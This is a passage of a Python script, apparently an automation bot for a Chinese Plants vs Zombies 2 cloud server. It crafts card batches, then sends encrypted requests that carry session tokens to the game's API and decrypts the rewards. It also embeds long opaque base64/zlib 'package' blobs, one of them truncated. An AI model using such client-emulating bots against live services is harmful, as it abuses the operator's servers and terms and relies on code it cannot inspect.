            {"needs": [0, 0, 0, 2, 0], "desc": "2紫"}
        ],
        "3": [
            {"needs": [2, 1, 1, 0, 0], "desc": "2白+1绿+1蓝"},
            {"needs": [4, 0, 1, 0, 0], "desc": "4白+1蓝"},
            {"needs": [0, 2, 1, 0, 0], "desc": "2绿+1蓝"},
            {"needs": [0, 4, 0, 0, 0], "desc": "4绿"},
            {"needs": [0, 0, 2, 0, 0], "desc": "2蓝"}
        ],
        "4": [
            {"needs": [2, 1, 0, 0, 0], "desc": "2白+1绿"},
            {"needs": [4, 0, 0, 0, 0], "desc": "4白"},
            {"needs": [0, 2, 0, 0, 0], "desc": "2绿"}
        ],
        "5": [
            {"needs": [2, 0, 0, 0, 0], "desc": "2白"}
        ]
    }
    if choice not in formula_map:
        print("无效选择！请输入 1~5 之间的数字。")
    else:
        formulas = formula_map[choice]
        print(f"\n选择了合成【{'橙色' if choice=='1' else '紫色' if choice=='2' else '蓝色' if choice=='3' else '绿色' if choice=='4' else '白色'}】卡，有以下合成方案：\n")
        for idx, formula in enumerate(formulas, 1):
            print(f"{idx}: {formula['desc']}")
        selected_indices_input = input("\n请输入想使用的方案编号（多个用空格分开，回车结束选择）：\n").strip()
        if not selected_indices_input:
            print("未选择任何方案，程序结束。")
        else:
            try:
                selected_indices = list(map(int, selected_indices_input.split()))
                valid_indices = set(range(1, len(formulas) + 1))
                invalid = set(selected_indices) - valid_indices
                if invalid:
                    print(f"输入包含无效方案编号：{invalid}，请重新运行并输入 1 ~ {len(formulas)} 之间的数字。")
                else:
                    selected_formulas = [formulas[i - 1] for i in selected_indices]
                    print(f"\n将使用以下 {len(selected_formulas)} 个方案进行合成：")
                    for idx, f in zip(selected_indices, selected_formulas):
                        print(f"方案 {idx}: {f['desc']}")
                    final_result = []
                    current_batch = []
                    for formula in selected_formulas:
                        while True:
                            can_craft = True
                            for i in range(len(formula["needs"])):
                                if len(materials[i]) < formula["needs"][i]:
                                    can_craft = False
                                    break
                            if not can_craft:
                                break
                            combo = []
                            for i in range(len(formula["needs"])):
                                count = formula["needs"][i]
                                if count > 0:
                                    combo.extend(materials[i][:count])
                                    materials[i] = materials[i][count:]
                            current_batch.append(combo)
                            if len(current_batch) >= 50:
                                final_result.append(current_batch)
                                current_batch = []
                    if current_batch:
                        final_result.append(current_batch)
                    else:
                        print(f"暂无可选择的多余碎片")
            except ValueError:
                print("输入格式错误！请输入数字编号，用空格分隔。")
        for l_list in final_result:
            data = {"req":"V915","e":{"l":l_list,"pi":pi,"sk":sk,"t":"0","ui":ui},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            decrypted_response = get_decrypted_data(url, data=response)
            decrypted_json = json.loads(decrypted_response)
            gl_list = decrypted_json['e']['d']['gl']
            items = {}
            for item in gl_list:
                i_value = str(item['i'])
                q_value = item['q']
                plant_info = formatted_plant.get(
                    i_value,
                    {"name": f"未知物品({i_value})", "pinzhi": "default"}
                )
                plant_name = plant_info["name"]
                plant_pinzhi = plant_info["pinzhi"]
                color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                print(f"获得的道具为: {color_code}{plant_name}{RESET_COLOR} x{q_value}")
def shibie(pi_val,ui_val,sk_val):
    global and_url
    global and_url2
    global package
    global _login_expired
    if pingtai == 'ios':
        and_url='http://cloudpvz2ios.ditwan.cn/index.php'
        and_url2='http://cloudpvz2ios.ditwan.cn'
        package = "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"
        data = {"req": "V303", "e": {"al": [{"id": 10622, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi_val, "sk": sk_val, "ui": ui_val, "v": 版本号}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, er_url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            _login_expired = True
        elif response_data.get("r") == 0:
            _login_expired = False
            # print("\033[38;5;46m文本正常\033[0m", end=" | ")  # 已隐藏
        else:
            print("\033[38;5;196m您已锁IP，请稍等几分钟再试\033[0m\n")
    else:
        and_url='http://cloudpvz2android.ditwan.cn/index.php'
        and_url2='http://cloudpvz2android.ditwan.cn'
        package = "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